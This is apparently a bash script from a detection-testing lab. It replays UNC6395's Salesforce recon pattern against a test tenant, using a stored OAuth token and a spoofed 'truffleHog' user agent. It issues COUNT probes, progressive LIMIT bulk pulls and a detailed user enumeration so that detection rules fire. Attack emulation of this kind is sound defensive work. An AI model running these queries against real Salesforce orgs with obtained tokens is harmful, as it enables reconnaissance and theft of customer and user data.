#!/usr/bin/env bash
# 04_recon_burst.sh
# Reproduce UNC6395's schema-then-bulk SOQL recon pattern against the test
# Salesforce tenant. Every request carries User-Agent: truffleHog so the
# burst doubles as the R1 IOC and the R5 volume signal.
#
# Mirrors:
#   - Cloudflare 2025-08-14 00:17:47 to 00:18:00 (COUNT sweep across Account, Contact, User)
#   - Cloudflare 2025-08-14 11:09:21 (detailed User table query, ordered by LastLoginDate)
#   - GTIG documentation of progressive LIMIT testing followed by bulk export
#
# 51 queries total = 5 COUNT probes + 5 passes of (3 objects x 3 LIMIT clauses) + 1 detailed User query.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
KEYS_DIR="$BASE_DIR/keys"
OUTPUT_DIR="$BASE_DIR/output"

mkdir -p "$OUTPUT_DIR"

if [ ! -f "$KEYS_DIR/access_token" ] || [ ! -f "$KEYS_DIR/instance_url" ]; then
  echo "ERROR: missing keys/access_token or keys/instance_url." >&2
  echo "  Run 02_exchange_code.sh or 03_refresh_access_token.sh first." >&2
  exit 1
fi

ACCESS="$(cat "$KEYS_DIR/access_token")"
INSTANCE="$(cat "$KEYS_DIR/instance_url")"
UA='truffleHog'
API_VERSION='v60.0'
LOG="$OUTPUT_DIR/recon_burst.log"

: > "$LOG"

run_q () {
  local q="$1"
  echo "[$(date -u +%FT%TZ)] GET /services/data/$API_VERSION/query  UA=$UA  q=$q" >> "$LOG"
  curl -sS -A "$UA" \
    -H "Authorization: Bearer $ACCESS" \
    --data-urlencode "q=$q" \
    -G "$INSTANCE/services/data/$API_VERSION/query" \
    >> "$LOG"
  echo >> "$LOG"
  echo >> "$LOG"
}

echo "[$(date -u +%FT%TZ)] recon burst start" >> "$LOG"

# 1. COUNT probes (T1087.004 / R5 anchor). Mirrors Cloudflare 2025-08-14 00:17:47 to 00:18:00.
for OBJ in Account Contact User Case Opportunity; do
  run_q "SELECT Count() FROM $OBJ"
done

# 2. Progressive LIMIT pulls. Five passes to push API call count past R5's >50-in-5-min threshold.
for PASS in 1 2 3 4 5; do
  for OBJ in Account Contact User; do
    for LIMIT in 10 100 1000; do
      run_q "SELECT Id, Name FROM $OBJ LIMIT $LIMIT"
    done
  done
done

# 3. Detailed User enumeration. Mirrors Cloudflare 2025-08-14 11:09:21 entry.
run_q "SELECT Id, Username, Email, FirstName, LastName, Title, IsActive, LastLoginDate, CreatedDate FROM User WHERE IsActive = true ORDER BY LastLoginDate DESC NULLS LAST LIMIT 20"

echo "[$(date -u +%FT%TZ)] recon burst end" >> "$LOG"

QUERY_COUNT="$(grep -c 'GET /services/data' "$LOG" || true)"
echo "Recon burst complete. Wrote $LOG"
echo "  Total queries issued: $QUERY_COUNT"
echo "  User-Agent on every request: $UA"
echo "Next: capture the Connected App OAuth Usage screenshot (Setup -> Apps -> Connected Apps -> Manage Connected Apps -> Internal Drift Analog -> OAuth Usage)."
